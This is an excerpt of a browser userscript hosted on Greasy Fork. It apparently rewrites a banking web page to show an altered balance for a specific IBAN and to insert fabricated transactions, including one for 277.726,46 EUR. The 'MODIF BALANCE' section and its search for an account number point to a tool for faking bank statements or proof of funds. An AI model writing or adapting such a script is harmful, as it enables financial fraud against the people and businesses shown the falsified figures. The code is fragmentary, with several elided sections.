...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/484147/Ed%20Combined%20Herbert%20Roth.user.js
// @updateURL https://update.greasyfork.org/scripts/484147/Ed%20Combined%20Herbert%20Roth.meta.js
// ==/UserScript==
...
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE-------------
    ...
    var modificationValue = 9.00; // Change this value as needed

    // Specify the text to search for in the page
    var searchText = "AT41 3743 1000 0250 6509";
    ...
    var transactions = [
        {
            ...
            transactionAmount: "277.726,46 EUR",
